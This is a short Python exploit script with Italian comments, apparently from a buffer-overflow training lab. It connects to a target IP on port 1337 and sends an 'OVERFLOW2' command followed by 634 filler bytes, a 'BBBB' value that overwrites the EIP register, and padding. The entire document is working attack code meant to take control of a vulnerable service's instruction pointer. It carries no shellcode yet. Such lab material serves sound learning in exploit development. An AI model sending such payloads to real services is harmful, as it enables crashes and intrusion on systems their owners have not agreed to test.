import socket 
ip = "192.168.1.11" # Sostituire con l'IP target 
port = 1337 
timeout = 5 
# Offset EIP = 634 
# Valore EIP = BBBB (0x42424242) 
# Valore ESP = CCCCC... (0x434343...) 
payload = b'A'*634 + b'\x42\x42\x42\x42' + b'C' * 16 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.settimeout(timeout) 
con = s.connect((ip, port)) 
s.recv(1024) 
# Inviare comando e payload come byte 
s.send(b"OVERFLOW2 " + payload) 
s.recv(1024)
s.close()